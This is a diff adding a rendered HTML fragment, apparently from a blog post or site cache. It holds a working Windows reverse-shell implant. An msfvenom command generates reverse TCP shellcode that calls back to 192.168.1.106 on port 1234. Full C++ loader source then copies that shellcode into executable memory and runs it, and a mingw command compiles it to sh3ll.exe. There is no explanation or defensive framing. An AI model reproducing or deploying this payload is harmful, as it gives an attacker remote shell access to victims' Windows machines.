@@ -1,0 +1,43 @@
+I"�<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.1.106 <span class="nv">LPORT</span><span class="o">=</span>1234 <span class="nt">-f</span> c <span class="nt">-b</span> <span class="se">\x</span>00<span class="se">\x</span>0a<span class="se">\x</span>0d
+</code></pre></div></div>
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
+#include &lt;stdlib.h&gt;
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
+<span class="s">"</span><span class="se">\xdb\xc0\xd9\x74\x24\xf4\xba\x51\x16\xc8\xcb\x5e\x29\xc9\xb1</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x52\x83\xc6\x04\x31\x56\x13\x03\x07\x05\x2a\x3e\x5b\xc1\x28</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xc1\xa3\x12\x4d\x4b\x46\x23\x4d\x2f\x03\x14\x7d\x3b\x41\x99</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xf6\x69\x71\x2a\x7a\xa6\x76\x9b\x31\x90\xb9\x1c\x69\xe0\xd8</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x9e\x70\x35\x3a\x9e\xba\x48\x3b\xe7\xa7\xa1\x69\xb0\xac\x14</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x9d\xb5\xf9\xa4\x16\x85\xec\xac\xcb\x5e\x0e\x9c\x5a\xd4\x49</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x3e\x5d\x39\xe2\x77\x45\x5e\xcf\xce\xfe\x94\xbb\xd0\xd6\xe4</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x44\x7e\x17\xc9\xb6\x7e\x50\xee\x28\xf5\xa8\x0c\xd4\x0e\x6f</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x6e\x02\x9a\x6b\xc8\xc1\x3c\x57\xe8\x06\xda\x1c\xe6\xe3\xa8</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x7a\xeb\xf2\x7d\xf1\x17\x7e\x80\xd5\x91\xc4\xa7\xf1\xfa\x9f</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xc6\xa0\xa6\x4e\xf6\xb2\x08\x2e\x52\xb9\xa5\x3b\xef\xe0\xa1</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x88\xc2\x1a\x32\x87\x55\x69\x00\x08\xce\xe5\x28\xc1\xc8\xf2</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x4f\xf8\xad\x6c\xae\x03\xce\xa5\x75\x57\x9e\xdd\x5c\xd8\x75</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x1d\x60\x0d\xd9\x4d\xce\xfe\x9a\x3d\xae\xae\x72\x57\x21\x90</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x63\x58\xeb\xb9\x0e\xa3\x7c\x06\x66\xaa\x16\xee\x75\xac\xe2</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x3c\xf0\x4a\x80\xd0\x55\xc5\x3d\x48\xfc\x9d\xdc\x95\x2a\xd8</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xdf\x1e\xd9\x1d\x91\xd6\x94\x0d\x46\x17\xe3\x6f\xc1\x28\xd9</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x07\x8d\xbb\x86\xd7\xd8\xa7\x10\x80\x8d\x16\x69\x44\x20\x00</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xc3\x7a\xb9\xd4\x2c\x3e\x66\x25\xb2\xbf\xeb\x11\x90\xaf\x35</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x99\x9c\x9b\xe9\xcc\x4a\x75\x4c\xa7\x3c\x2f\x06\x14\x97\xa7</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xdf\x56\x28\xb1\xdf\xb2\xde\x5d\x51\x6b\xa7\x62\x5e\xfb\x2f</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x1b\x82\x9b\xd0\xf6\x06\xab\x9a\x5a\x2e\x24\x43\x0f\x72\x29</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x74\xfa\xb1\x54\xf7\x0e\x4a\xa3\xe7\x7b\x4f\xef\xaf\x90\x3d</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x60\x5a\x96\x92\x81\x4f</span><span class="s">"</span><span class="p">;</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buf</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+	<span class="n">memcpy</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span> <span class="n">buf</span><span class="p">);</span>
+	<span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec</span><span class="p">)();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>➜  ~  i686-w64-mingw32-g++ sh3ll.c -o sh3ll.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+➜  ~  file sh3ll.exe
+sh3ll.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
+```</p>
+:ET
